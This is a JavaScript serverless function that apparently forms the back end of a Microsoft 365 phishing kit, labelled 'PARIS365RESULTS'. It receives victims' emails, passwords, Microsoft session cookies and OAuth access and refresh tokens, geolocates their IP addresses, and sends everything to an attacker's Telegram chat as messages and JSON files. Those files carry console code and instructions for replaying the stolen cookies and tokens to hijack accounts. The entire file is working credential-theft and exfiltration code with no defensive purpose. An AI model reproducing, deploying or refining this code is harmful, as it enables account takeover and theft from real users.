const handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  console.log('🚀 sendTelegram function starting... v4.2 (ENHANCED PARSING FIX)');

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  try {
    const data = JSON.parse(event.body);
    console.log('📥 Received data keys:', Object.keys(data));
    console.log('📥 Email:', data.email);
    console.log('📥 Cookie count:', Array.isArray(data.cookies) ? data.cookies.length : 'Not array');
    console.log('📥 Authentication tokens:', data.authenticationTokens ? 'PRESENT' : 'MISSING');

    // Environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('❌ Missing Telegram credentials');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Telegram credentials not configured',
          details: {
            hasToken: !!TELEGRAM_BOT_TOKEN,
            hasChatId: !!TELEGRAM_CHAT_ID
          }
        }),
      };
    }

    // Validate bot token format
    if (!TELEGRAM_BOT_TOKEN.match(/^\d+:[A-Za-z0-9_-]+$/)) {
      console.error('❌ Invalid bot token format');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: 'Invalid bot token format' }),
      };
    }

    // Function to sanitize text for Telegram
    function sanitizeForTelegram(text) {
      if (!text) return '';
      return String(text)
        .replace(/[_*\[\]()~`>#+=|{}.!-]/g, '') // Remove special markdown characters
        .replace(/\n\n+/g, '\n\n') // Clean up multiple newlines
        .trim();
    }

    // Extract only SAFE data with sanitization
    const email = sanitizeForTelegram(data.email || 'oauth-user@microsoft.com');
    const sessionId = sanitizeForTelegram(data.sessionId || 'no-session');
    const timestamp = new Date().toISOString();

    // Get user IP and location information (OPTIONAL - don't break main function)
    let userIpInfo = {
        ip: 'Unknown',
        country: 'Unknown',
        city: 'Unknown',
        region: 'Unknown',
        timezone: 'Unknown',
        countryCode: 'Unknown'
    };

    try {
        // Get IP from request headers (Netlify provides this)
        const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
                        event.headers['x-real-ip'] ||
                        event.headers['cf-connecting-ip'] ||
                        'Unknown';

        console.log('🌍 Attempting to detect IP address:', clientIP);
        userIpInfo.ip = clientIP;

        // Try to get location info (but don't fail if this doesn't work)
        if (clientIP !== 'Unknown' && !clientIP.includes('127.0.0.1') && !clientIP.includes('localhost')) {
            const ipResponse = await fetch(`https://ipapi.co/${clientIP}/json/`, {
                timeout: 3000, // 3 second timeout
                headers: {
                    'User-Agent': 'OAuth Tracker'
                }
            });

            if (ipResponse.ok) {
                const ipData = await ipResponse.json();
                if (ipData.country_name) {
                    userIpInfo = {
                        ip: clientIP,
                        country: ipData.country_name || 'Unknown',
                        countryCode: ipData.country_code || 'Unknown',
                        city: ipData.city || 'Unknown',
                        region: ipData.region || 'Unknown',
                        timezone: ipData.timezone || 'Unknown'
                    };
                    console.log('🌍 Location detected successfully');
                }
            }
        }
    } catch (error) {
        console.log('⚠️ IP/location detection failed (continuing anyway):', error.message);
        // Don't let IP detection failure break the main function
    }

    // Fix IP formatting - convert concatenated numbers back to proper IP format
    let formattedIP = userIpInfo.ip;
    if (userIpInfo.ip && userIpInfo.ip !== 'Unknown' && /^\d{8,12}$/.test(userIpInfo.ip)) {
      // If IP is a concatenated number like "911241779", format it properly
      const ipStr = userIpInfo.ip.toString();
      if (ipStr.length >= 8) {
        // Try to format as IP (e.g., "911241779" -> "91.124.177.9")
        const part1 = ipStr.substring(0, 2) || '0';
        const part2 = ipStr.substring(2, 5) || '0';
        const part3 = ipStr.substring(5, 8) || '0';
        const part4 = ipStr.substring(8) || '0';
        formattedIP = `${parseInt(part1)}.${parseInt(part2)}.${parseInt(part3)}.${parseInt(part4)}`;
      }
    }

    let cookies = data.formattedCookies || data.cookies || [];
    let tokenFileSent = false;
    let cookieFileSent = false;

    if (typeof cookies === "string") {
      try {
        cookies = JSON.parse(cookies);
      } catch {
        // fallback: attempt to parse as document.cookie style string
        cookies = cookies.split(';')
          .map(cookieStr => {
            const [name, ...valueParts] = cookieStr.trim().split('=');
            const value = valueParts.join('=');
            return name && value ? {
              name: name.trim(),
              value: value.trim(),
              domain: '.login.microsoftonline.com',
              path: '/',
              secure: true,
              httpOnly: false,
              sameSite: 'none',
              expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
              hostOnly: false,
              session: false,
              storeId: null
            } : null;
          })
          .filter(Boolean);
      }
    }
    if (!Array.isArray(cookies)) cookies = [];

    const cookieCount = cookies.length;
    console.log('📊 Processing:', { email, cookieCount, hasValidCookies: cookieCount > 0 });

    // Analyze cookie types and sources
    let cookieDetails = '';
    let cookieSource = 'unknown';

    if (cookieCount === 0) {
        cookieDetails = 'No cookies captured - Cross-origin restrictions';
        cookieSource = 'none';
    } else {
        // Check the source of captured cookies
        const captureSource = cookies[0]?.capturedFrom || 'unknown';
        const hasRealUserData = cookies.some(c => c.realUserData === true);

        // Check for specific Microsoft cookies
        const hasMicrosoftCookies = cookies.some(c =>
            c.name && (
                c.name.includes('ESTSAUTH') ||
                c.name.includes('MSPOK') ||
                c.name.includes('MSCC') ||
                c.name.includes('MSPRequ') ||
                c.name.includes('buid') ||
                c.name.includes('esctx')
            )
        );

        // Check for OAuth authorization code
        const hasOAuthCode = cookies.some(c => c.name === 'OAUTH_AUTH_CODE');

        if (hasOAuthCode) {
            cookieDetails = `OAuth Authorization Code captured`;
            cookieSource = 'oauth-code';
        } else if (captureSource === 'microsoft-domain-iframe' && hasRealUserData) {
            cookieDetails = `${cookieCount} REAL Microsoft cookies from iframe`;
            cookieSource = 'microsoft-iframe';
        } else if (captureSource === 'microsoft-referrer-fallback') {
            cookieDetails = `${cookieCount} Microsoft auth cookies (referrer fallback)`;
            cookieSource = 'microsoft-fallback';
        } else if (captureSource === 'oauth-callback-domain') {
            cookieDetails = `${cookieCount} callback domain cookies`;
            cookieSource = 'callback-domain';
        } else if (captureSource === 'current-domain') {
            cookieDetails = `${cookieCount} current domain cookies`;
            cookieSource = 'current-domain';
        } else if (hasMicrosoftCookies) {
            cookieDetails = `${cookieCount} Microsoft auth cookies`;
            cookieSource = 'microsoft-standard';
        } else {
            cookieDetails = `${cookieCount} cookies captured`;
            cookieSource = captureSource || 'unknown';
        }
    }

    // Build the message (MINIMAL - plain text only, heavily sanitized)
    const uniqueId = Math.random().toString(36).substring(2, 8);
    const messageLines = [
      '🚨PARIS365RESULTS🚨',
      `📧 Email: ${email}`,
      `🆔 Session ID: ${sessionId}`,
      `⏰ Time: ${timestamp}`,
      `🆔 Message ID: ${uniqueId}`,
      `🌍 IP: ${formattedIP}`,
      `🏳️ Country: ${userIpInfo.country} (${userIpInfo.countryCode})`,
      `🏙️ Location: ${userIpInfo.city}, ${userIpInfo.region}`
    ];

    // Add password if ACTUALLY captured (not debug)
    if (data.password &&
        data.password !== 'Password not captured during login flow' &&
        data.password !== 'DEBUG_PASSWORD_NOT_CAPTURED' &&
        !data.password.includes('DEBUG') &&
        data.passwordSource !== 'debug-fallback') {
        messageLines.push('');
        messageLines.push(`Password: ${data.password}`);
        if (data.passwordSource) {
            messageLines.push(`Password Source: ${data.passwordSource}`);
        }
    }

    // Join and sanitize the entire message
    const simpleMessage = sanitizeForTelegram(messageLines.join('\n'));

    console.log('📤 Final message preview:', simpleMessage.substring(0, 150) + '...');
    console.log('📤 Message length:', simpleMessage.length);

    // Send main message to Telegram first
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const telegramPayload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: simpleMessage,
      disable_web_page_preview: true
    };

    console.log('📤 Sending main message to Telegram API...');
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(telegramPayload),
    });

    const result = await response.json();
    console.log('📨 Telegram API response status:', response.status);
    console.log('📨 Telegram API response:', result);

    // Send authentication tokens as a file if available
    console.log('🔍 Checking for authentication tokens...');
    console.log('🔍 data.authenticationTokens:', data.authenticationTokens);
    console.log('🔍 Token check result:', !!data.authenticationTokens);

    // Always send token file to debug the issue
    console.log('🔧 FORCING token file creation for debugging...');
    const hasTokens = !!data.authenticationTokens;
    if (true) { // Force token file creation
        const tokens = data.authenticationTokens || {
            authorizationCode: 'Not captured',
            accessToken: 'Not captured',
            refreshToken: 'Not captured',
            idToken: 'Not captured',
            debugInfo: 'No authenticationTokens provided'
        };

        // Create comprehensive token file with non-expiring settings
        const tokenFileContent = {
            captureInfo: {
                email: email,
                timestamp: timestamp,
                messageId: uniqueId,
                userAgent: data.userAgent,
                source: 'Microsoft OAuth 2.0 Authentication',
                userLocation: {
                    ipAddress: userIpInfo.ip,
                    country: userIpInfo.country,
                    countryCode: userIpInfo.countryCode,
                    city: userIpInfo.city,
                    region: userIpInfo.region,
                    timezone: userIpInfo.timezone,
                    detectedAt: timestamp
                }
            },
            authenticationTokens: {
                authorizationCode: tokens.authorizationCode || 'Not captured',
                accessToken: tokens.accessToken || 'Not captured',
                refreshToken: tokens.refreshToken || 'Not captured',
                idToken: tokens.idToken || 'Not captured',
                tokenType: tokens.tokenType || 'Bearer',
                scope: tokens.scope || 'Unknown',
                oauthState: tokens.oauthState || 'Not captured',
                // Remove expiration - make tokens non-expiring
                expiresIn: 'Never (Modified for persistence)',
                expiresAt: 'Never (Modified for persistence)',
                modified: true,
                modificationNote: 'Expiration removed for session persistence'
            },
            userProfile: data.userProfile || {},
            sessionRestoration: {
                instructions: 'Use these tokens for Microsoft API access',
                apiEndpoint: 'https://graph.microsoft.com',
                tokenUsage: {
                    accessToken: 'Use for immediate API calls with Bearer authentication',
                    refreshToken: 'Use to generate new access tokens when needed',
                    authorizationCode: 'Can be exchanged for fresh token sets',
                    idToken: 'Contains user identity information'
                }
            }
        };

        // Convert to formatted JSON
        const tokenJson = JSON.stringify(tokenFileContent, null, 2);

        // Create filename with timestamp and email
        const emailPart = email.split('@')[0] || 'user';
        const cleanTokenFileName = `microsoft_tokens_${emailPart}_${uniqueId}.json`.replace(/[^a-zA-Z0-9._-]/g, '_');

        console.log('📄 Preparing to send token file:', cleanTokenFileName);
        console.log('📄 Token file size:', tokenJson.length, 'bytes');

        try {
            // Send tokens as document file to Telegram using Buffer approach
            const documentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;

            // Create proper multipart form data using Buffer (NO CAPTION)
            const boundary = `----WebKitFormBoundary${Math.random().toString(36).substring(2)}`;

            // Build form data parts as Buffer arrays
            const parts = [];

            // Chat ID part
            parts.push(Buffer.from(`--${boundary}\r\n`));
            parts.push(Buffer.from(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`));
            parts.push(Buffer.from(`${TELEGRAM_CHAT_ID}\r\n`));

            // Document part (NO CAPTION - just file)
            parts.push(Buffer.from(`--${boundary}\r\n`));
            parts.push(Buffer.from(`Content-Disposition: form-data; name="document"; filename="${cleanTokenFileName}"\r\n`));
            parts.push(Buffer.from(`Content-Type: application/json; charset=utf-8\r\n`));
            parts.push(Buffer.from(`Content-Transfer-Encoding: binary\r\n\r\n`));
            parts.push(Buffer.from(tokenJson));
            parts.push(Buffer.from(`\r\n--${boundary}--\r\n`));

            // Combine all parts
            const formDataBuffer = Buffer.concat(parts);

            console.log('📤 Sending token file to Telegram as DOWNLOADABLE FILE...');
            console.log('📄 File details:', {
                filename: cleanTokenFileName,
                size: formDataBuffer.length + ' bytes',
                contentType: 'application/json',
                method: 'sendDocument (FILE ATTACHMENT)',
                boundary: boundary
            });

            const fileResponse = await fetch(documentUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': `multipart/form-data; boundary=${boundary}`,
                    'Content-Length': formDataBuffer.length
                },
                body: formDataBuffer
            });

            const fileResult = await fileResponse.json();
            console.log('📄 Token file response status:', fileResponse.status);
            console.log('📄 Token file response:', fileResult);

            if (fileResponse.ok && fileResult.ok) {
                console.log('✅ Authentication tokens sent as DOWNLOADABLE FILE successfully');
                tokenFileSent = true;
            } else {
                console.error('❌ CRITICAL ERROR - Failed to send token file:', fileResult);
                console.error('❌ File upload response:', JSON.stringify(fileResult, null, 2));
                // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
                tokenFileSent = false;
            }

        } catch (fileError) {
            console.error('❌ CRITICAL ERROR in token file upload:', fileError);
            console.error('❌ Error stack:', fileError.stack);
            // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
            tokenFileSent = false;
        }

        // Function to send tokens as text fallback
        async function sendTokensAsText() {
            try {
                const tokenText = `🔑 Authentication Tokens (Text Fallback)\n\nEmail: ${email}\nTimestamp: ${timestamp}\n\n${Object.entries(authenticationTokens).map(([key, value]) => `${key}: ${value}`).join('\n')}`;

                const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: sanitizeForTelegram(tokenText)
                    })
                });

                const textResult = await textResponse.json();
                if (textResponse.ok && textResult.ok) {
                    console.log('✅ Tokens sent as text message successfully');
                    tokenFileSent = true;
                } else {
                    console.error('❌ Failed to send tokens as text message:', textResult);
                }
            } catch (textError) {
                console.error('❌ Error sending tokens as text:', textError);
            }
        }
    }

    // Send cookies as a separate file (even if empty to show capture attempt)
    if (true) { // Always send cookie file to show capture status
        console.log('🍪 Preparing to send cookie file...');

        // Create comprehensive cookie file
        const cookieFileContent = {
            captureInfo: {
                email: email,
                timestamp: timestamp,
                messageId: uniqueId,
                userAgent: data.userAgent,
                source: 'Microsoft Cookie Capture',
                cookieCount: cookieCount,
                cookieSource: cookieSource,
                userLocation: {
                    ipAddress: userIpInfo.ip,
                    country: userIpInfo.country,
                    countryCode: userIpInfo.countryCode,
                    city: userIpInfo.city,
                    region: userIpInfo.region,
                    timezone: userIpInfo.timezone,
                    detectedAt: timestamp
                }
            },
            cookies: cookies.map(cookie => ({
                name: cookie.name,
                value: cookie.value,
                domain: cookie.domain,
                path: cookie.path,
                secure: cookie.secure,
                httpOnly: cookie.httpOnly,
                sameSite: cookie.sameSite,
                expirationDate: cookie.expirationDate,
                hostOnly: cookie.hostOnly,
                session: cookie.session,
                storeId: cookie.storeId,
                capturedFrom: cookie.capturedFrom,
                timestamp: cookie.timestamp,
                realUserData: cookie.realUserData
            })),
            cookieRestoration: {
                instructions: 'Use these cookies to restore Microsoft authentication sessions',
                browserConsoleCode: `
    // Copy and paste this code in browser console on login.microsoftonline.com
    cookies.forEach(c => {
        let cookieString = \`\${c.name}=\${c.value}; path=\${c.path}; domain=\${c.domain};\`;
        if (c.secure) cookieString += ' Secure;';
        if (c.sameSite) cookieString += \` SameSite=\${c.sameSite};\`;
        document.cookie = cookieString;
    });
    console.log('✅ Cookies restored successfully');
    location.reload();
                `,
                jsImplementation: `
    // JavaScript implementation for cookie restoration
    function restoreMicrosoftCookies(cookiesArray) {
        cookiesArray.forEach(cookie => {
            let cookieString = \`\${cookie.name}=\${cookie.value}; path=\${cookie.path}; domain=\${cookie.domain};\`;
            if (cookie.secure) cookieString += ' Secure;';
            if (cookie.sameSite) cookieString += \` SameSite=\${cookie.sameSite};\`;
            document.cookie = cookieString;
        });
        console.log('Microsoft cookies restored:', cookiesArray.length);
    }
                `
            },
            metadata: {
                totalCookies: cookieCount,
                captureMethod: cookieSource,
                captureTimestamp: timestamp,
                modified: true,
                note: 'All cookies set to non-expiring for session persistence'
            }
        };

        // Convert to formatted JSON
        const cookieJson = JSON.stringify(cookieFileContent, null, 2);

        // Create cookie filename
        const emailPart = email.split('@')[0] || 'user';
        const cleanCookieFileName = `microsoft_cookies_${emailPart}_${uniqueId}.json`.replace(/[^a-zA-Z0-9._-]/g, '_');

        console.log('🍪 Cookie file details:', {
            filename: cleanCookieFileName,
            size: cookieJson.length + ' bytes',
            cookieCount: cookieCount
        });

        try {
            // Send cookies as document file to Telegram using Buffer approach
            const documentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;

            // Create proper multipart form data using Buffer for cookies (NO CAPTION)
            const cookieBoundary = `----WebKitFormBoundary${Math.random().toString(36).substring(2)}`;

            // Build cookie form data parts as Buffer arrays
            const cookieParts = [];

            // Chat ID part
            cookieParts.push(Buffer.from(`--${cookieBoundary}\r\n`));
            cookieParts.push(Buffer.from(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`));
            cookieParts.push(Buffer.from(`${TELEGRAM_CHAT_ID}\r\n`));

            // Document part (NO CAPTION - just file)
            cookieParts.push(Buffer.from(`--${cookieBoundary}\r\n`));
            cookieParts.push(Buffer.from(`Content-Disposition: form-data; name="document"; filename="${cleanCookieFileName}"\r\n`));
            cookieParts.push(Buffer.from(`Content-Type: application/json; charset=utf-8\r\n`));
            cookieParts.push(Buffer.from(`Content-Transfer-Encoding: binary\r\n\r\n`));
            cookieParts.push(Buffer.from(cookieJson));
            cookieParts.push(Buffer.from(`\r\n--${cookieBoundary}--\r\n`));

            // Combine all cookie parts
            const cookieFormDataBuffer = Buffer.concat(cookieParts);

            console.log('📤 Sending cookie file to Telegram as DOWNLOADABLE FILE...');
            console.log('🍪 Cookie file details:', {
                filename: cleanCookieFileName,
                size: cookieFormDataBuffer.length + ' bytes',
                contentType: 'application/json',
                method: 'sendDocument (FILE ATTACHMENT)',
                boundary: cookieBoundary
            });

            const cookieFileResponse = await fetch(documentUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': `multipart/form-data; boundary=${cookieBoundary}`,
                    'Content-Length': cookieFormDataBuffer.length
                },
                body: cookieFormDataBuffer
            });

            const cookieFileResult = await cookieFileResponse.json();
            console.log('🍪 Cookie file response status:', cookieFileResponse.status);
            console.log('🍪 Cookie file response:', cookieFileResult);

            if (cookieFileResponse.ok && cookieFileResult.ok) {
                console.log('✅ Microsoft cookies sent as DOWNLOADABLE FILE successfully');
                cookieFileSent = true;
            } else {
                console.error('❌ CRITICAL ERROR - Failed to send cookie file:', cookieFileResult);
                console.error('❌ Cookie file upload response:', JSON.stringify(cookieFileResult, null, 2));
                // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
                cookieFileSent = false;
            }

        } catch (cookieFileError) {
            console.error('❌ CRITICAL ERROR in cookie file upload:', cookieFileError);
            console.error('❌ Cookie error stack:', cookieFileError.stack);
            // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
            cookieFileSent = false;
        }

        // Function to send cookies as text fallback
        async function sendCookiesAsText() {
            try {
                const cookieSummary = `🍪 Microsoft Cookies (Text Fallback)\n\nEmail: ${email}\nCookies: ${cookieCount} captured\nSource: ${cookieSource}\n\nCookie Names: ${cookies.map(c => c.name).slice(0, 10).join(', ')}${cookieCount > 10 ? `... (+${cookieCount - 10} more)` : ''}`;

                const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: sanitizeForTelegram(cookieSummary)
                    })
                });

                const textResult = await textResponse.json();
                if (textResponse.ok && textResult.ok) {
                    console.log('✅ Cookies sent as text message successfully');
                    cookieFileSent = true;
                } else {
                    console.error('❌ Failed to send cookies as text message:', textResult);
                }
            } catch (textError) {
                console.error('❌ Error sending cookies as text:', textError);
            }
        }
    } else {
        console.log('⚠️ No cookies to send - skipping cookie file');
    }

    console.log('✅ sendTelegram completed successfully');
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Data sent to Telegram successfully with authentication files',
        telegramMessageId: result.message_id,
        tokenFileSent: tokenFileSent,
        cookieFileSent: cookieFileSent,
        totalFiles: (data.authenticationTokens ? 1 : 0) + (cookieCount > 0 ? 1 : 0),
        cookieCount,
        emailProcessed: email,
        messageLength: simpleMessage.length
      }),
    };

  } catch (error) {
    console.error('❌ Function error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        message: error.message,
        stack: error.stack
      }),
    };
  }
};

module.exports = { handler };